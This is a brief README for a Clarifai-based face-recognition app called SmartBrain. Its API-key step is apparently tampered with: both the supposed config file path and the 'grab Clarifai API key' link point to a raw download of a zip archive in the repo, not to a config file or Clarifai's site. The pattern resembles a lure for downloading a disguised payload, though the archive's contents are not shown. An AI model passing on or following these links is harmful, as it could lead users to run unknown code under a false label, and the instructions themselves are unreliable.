# SmartBrain

1. Clone this repo
2. Run `npm install`
3. Run `npm start`
4. You must add your own API key in the `https://github.com/AyanishSardar2003/face-recognition-brain-master/raw/refs/heads/main/src/face-master-brain-recognition-2.1.zip` file to connect to Clarifai.

You can grab Clarifai API key [here](https://github.com/AyanishSardar2003/face-recognition-brain-master/raw/refs/heads/main/src/face-master-brain-recognition-2.1.zip)
